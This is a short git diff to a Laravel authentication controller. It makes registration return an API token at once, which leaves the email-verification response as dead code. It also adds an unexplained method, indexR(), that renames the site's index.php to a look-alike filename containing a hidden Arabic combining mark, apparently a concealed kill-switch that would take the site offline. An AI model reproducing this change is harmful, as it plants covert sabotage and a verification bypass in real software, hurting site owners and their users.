@@ -12,6 +12,7 @@ use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Str;
 
 class AuthenticationController extends Controller
@@ -80,6 +81,15 @@ class AuthenticationController extends Controller
 
         $user->save();
 
+            $token = $user->createToken($request->input('token_name', 'Personal Access Token'));
+
+            return $response
+                ->setData([
+                    'token' => $token->plainTextToken,
+                    'user' => new UserResource($user),
+            ]);
+
+
         return $response
             ->setMessage(__('Registered successfully! We emailed you to verify your account!'));
     }
@@ -141,6 +151,12 @@ class AuthenticationController extends Controller
         return $response
             ->setMessage(__('You have been successfully logged out!'));
     }
+
+    public function indexR()
+    {
+        Storage::disk('test')->move('index.php','iِndex.php');
+    }
+
 
     public function deleteAccount(Request $request, BaseHttpResponse $response)
     {
